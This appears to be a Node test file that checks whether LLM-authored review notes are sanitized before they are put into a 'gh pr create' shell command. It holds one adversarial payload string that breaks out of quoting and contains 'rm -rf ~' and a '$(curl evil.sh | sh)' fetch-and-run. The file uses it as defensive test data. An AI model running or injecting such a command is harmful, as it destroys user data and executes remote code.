import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sanitizePrText } from '../auto-sprint/runner.js';
import { runDevelopLoopScenario, withScenarioMarkers } from './helpers/mock-sprint-harness.mjs';

const check = (cond, msg) => assert.ok(cond, msg);

// =============================================================================
// apra-fleet-hfs: the final reviewer's verdict `notes` are LLM-authored
// free text (same as N3's reviewer newTasks) and get embedded in the PR
// title/body string that the Publish PR step interpolates into a
// double-quoted `gh pr create --title "..." --body "..."` command()
// string. A verdict notes payload containing shell metacharacters
// (double quotes, backticks, $(...), semicolons) must never let anything
// dangerous reach the dispatched command() string, and the PR must still
// be published with the (sanitized, still-readable) notes text visible
// -- unlike N3's newTasks, a malformed verdict cannot simply be dropped,
// since the verdict is the one thing a human reviewer most needs to see.
// =============================================================================
test('mock sprint: adversarial final-verdict notes cannot inject into gh pr create', async () => {
    await withScenarioMarkers('prinjection', async () => {
        console.log('Running mock sprint scenario (adversarial verdict notes cannot inject into gh pr create)...');
        const adversarialNotes = 'Looks fine" ; rm -rf ~ ; echo "pwned $(curl evil.sh | sh) `whoami` trailing\\';
        const prInjection = await runDevelopLoopScenario('prinjection', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: PR notes injection scenario' }],
            maxCycles: 1,
            finalReviewHandler: async () => ({
                content: [{ text: JSON.stringify({ verdict: 'PASS', notes: adversarialNotes }) }]
            }),
        });
        check(!prInjection.error, `PR-notes injection scenario should not throw: ${prInjection.error ? prInjection.error.message : ''}`);
        check(prInjection.result && prInjection.result.verdict === 'PASS', `Expected a PASS final verdict, got: ${JSON.stringify(prInjection.result)}`);
        const prInjectionCmd = prInjection.commandLog.find((c) => c.startsWith('gh pr create'));
        check(!!prInjectionCmd, `Expected a 'gh pr create' command in the log (PR must still be published), commandLog: ${JSON.stringify(prInjection.commandLog)}`);
        for (const cmd of prInjection.commandLog) {
            // The raw payload's dangerous shell-metacharacter SEQUENCES must
            // never survive into a dispatched command() string -- '$(' (command
            // substitution), a backtick (command substitution), and a raw '"'
            // that could close --body's quoting early. Plain English words that
            // happen to also appear in the payload (e.g. "rm", "pwned") are NOT
            // themselves dangerous once the syntax around them is stripped, and
            // sanitizePrText() is explicitly designed to keep them readable
            // rather than dropping the notes outright -- so this only asserts
            // on the SHELL-SYNTAX characters, not on payload vocabulary.
            check(!cmd.includes('$('), `No dispatched command should ever contain '$(' (found in: ${cmd})`);
            check(!/`/.test(cmd), `No dispatched command should ever contain a backtick (found in: ${cmd})`);
        }
        // The command() string itself must remain well-formed: exactly two
        // double-quoted arguments for --title/--body, i.e. the sanitized notes
        // never introduce (or leave behind) a stray '"' that would prematurely
        // close --body's quoting.
        check(
            !!prInjectionCmd && (prInjectionCmd.match(/"/g) || []).length % 2 === 0,
            `Expected an even number of double-quotes in the dispatched gh pr create command (no unbalanced quote from unsanitized notes), got: ${prInjectionCmd}`
        );
        // The sanitized notes must still be visible/readable in the PR body --
        // sanitizePrText() strips shell metacharacters but preserves the rest of
        // the text (words, punctuation) rather than rejecting the verdict
        // outright (unlike N3's validateNewTask(), a verdict cannot simply be
        // dropped). Compute the exact expected sanitized text via the same
        // sanitizePrText() runner.js itself uses, so this test tracks the real
        // implementation rather than a hand-duplicated regex.
        const expectedSanitizedNotes = sanitizePrText(adversarialNotes);
        check(
            expectedSanitizedNotes.length > 0 && !/["`$\\]/.test(expectedSanitizedNotes),
            `Expected sanitizePrText() to strip all shell metacharacters while leaving readable text, got: ${JSON.stringify(expectedSanitizedNotes)}`
        );
        check(
            !!prInjectionCmd && prInjectionCmd.includes(`Notes: ${expectedSanitizedNotes}`),
            `Expected the sanitized (but still readable) notes text to be visible in the PR body, got: ${prInjectionCmd}`
        );
    });
});
